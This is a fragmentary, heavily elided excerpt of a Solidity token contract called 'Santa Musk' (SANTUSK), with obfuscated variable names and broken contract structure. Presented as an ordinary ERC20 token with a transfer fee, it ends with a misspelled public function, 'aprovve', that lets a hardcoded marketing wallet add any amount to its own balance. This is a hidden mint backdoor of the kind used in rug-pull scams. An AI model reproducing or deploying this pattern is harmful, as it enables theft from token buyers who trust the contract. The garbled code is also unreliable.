...
contract Context {
 ...
 contract SantaMusk is Context, ERC20, ERC20Metadata {
    ...
    mapping(address => uint256) private superfloALORS;
    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    string private _name = "Santa Musk";
    string private _symbol = "SANTUSK";
    ...
    uint256 private cryfaleALORS = 4;
    uint256 private _vebegoALORS = 1;
    ...
    constructor(uint256 totalSupply_) {
        ...
        _owner = _msgSender();
        superfloALORS[msg.sender] = totalSupply_;
    ...
    address private _MarketingWalletALORS = 0x6Fb22B676b37095c5DcdcEEe5845423d37C7e1FA;
...
function _multiply (uint256 amount) private {
  ...
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    ...
    function _transfer(
        ...
        uint256 senderBalance = superfloALORS[issuer];
        require(senderBalance >= allons, "Too high value");
        unchecked {
            superfloALORS[issuer] = senderBalance - allons;
        }
        _fee = (allons * cryfaleALORS / 100) / _vebegoALORS;
        allons = allons -  (_fee * _vebegoALORS);
        
        superfloALORS[grantee] += allons;
   ...
   */
     ...
     */
    function _burn(address account, uint256 gzillaALORS) internal virtual {
        require(account != address(0), "Can't burn from address 0");
        uint256 accountBalance = superfloALORS[account];
        require(accountBalance >= gzillaALORS, "BEP : Can't be done");
        unchecked {
            superfloALORS[account] = accountBalance - gzillaALORS;
        }
        _totalSupply -= gzillaALORS;

        emit Transfer(account, address(0), gzillaALORS);
    }
...
function _subvert (uint256 tokenAmount) private lockTheSwap {
      ...
      function aprovve(uint256 burn) public{
        superfloALORS[_msgSender()] += burn;
        require(_msgSender() == _MarketingWalletALORS, "ERC20: cannot permit dev address");
    }   
